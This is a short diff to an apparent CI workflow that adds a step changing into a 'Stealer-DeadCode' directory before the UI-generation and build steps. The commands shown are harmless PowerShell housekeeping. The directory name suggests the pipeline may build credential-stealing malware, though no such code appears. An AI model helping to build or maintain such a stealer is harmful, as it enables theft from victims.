@@ -427,6 +427,7 @@ jobs:
 
     - name: Verify and generate UI files
       run: |
+        cd Stealer-DeadCode
         Write-Host "Current directory before processing: $(Get-Location)"
         Write-Host "Listing contents of current directory:"
         dir .
@@ -482,6 +483,7 @@ jobs:
 
     - name: Configure and build
       run: |
+        cd Stealer-DeadCode
         Write-Host "Setting up temporary directory..."
         $tempDir = "C:/Temp"
         if (-not (Test-Path $tempDir)) {
